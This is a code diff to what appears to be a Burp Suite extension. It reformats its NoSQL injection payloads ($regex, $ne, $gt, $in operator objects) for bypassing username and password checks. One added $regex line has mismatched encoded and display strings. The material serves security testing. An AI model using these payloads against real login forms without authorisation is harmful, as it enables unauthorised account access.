@@ -39,20 +39,20 @@ public class NNN implements BurpExtension {
 
         // Payloads for username field
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$regex\":\"admin.*\"}"), "{\"$regex\":\"admin.*\"}", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("admin"), "admin", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $regex \":\" admin .*\"}"), "{\" $regex \":\" admin .*\"}", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $ne \": null }"), "{\" $ne \": null }", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $ne \": \" foo \"}"), "{\" $ne \": \" foo \"}", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $gt \": undefined }"), "{\" $gt \": undefined }", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $gt \":\"\"}"), "{\" $gt \":\"\"}", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $in \":[\" Admin \", \"4dm1n \", \" admin \" , \" root \", \" administrator \"]}"), "{\" $in \":[\" Admin \", \"4dm1n \", \" admin \" , \" root \", \" administrator \"]}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("\"admin\""), "\"admin\"", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$regex\":\"admin .*\"}"), "{\"$regex \":\"admin.*\"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$ne\":null}"), "{\"$ne\":null}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$ne\":\"foo\"}"), "{\"$ne\":\"foo\"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$gt\":undefined}"), "{\"$gt\":undefined}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$gt\":\"\"}"), "{\"$gt\":\"\"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\"$in\":[\"Admin\", \"4dm1n\", \"admin\" , \"root\", \"administrator\"]}"), "{\"$in\":[\"Admin\", \"4dm1n\", \"admin\" , \"root\", \"administrator\"]}", null));
 
         // Payloads for password field
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \":\" invalidpassword \"}"), "{\" $ne \":\" invalidpassword \"}", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \": null }"), "{\" $ne \": null }", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\"$ne\": \"xd\"}"), "{\"$ne\": \"xd\"}", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $gt \": undefined }"), "{\" $gt \": undefined }", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $gt \":\"\"}"), "{\" $gt \":\"\"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\"$ne\":\"invalidpassword\"}"), "{\"$ne\":\"invalidpassword\"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\"$ne\":null}"), "{\"$ne\":null}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\"$ne\":\"xd\"}"), "{\"$ne\":\"xd\"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\"$gt\":undefined}"), "{\"$gt\":undefined}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\"$gt\":\"\"}"), "{\"$gt\":\"\"}", null));
 
         // Data extraction payloads have to be handled directly
     }
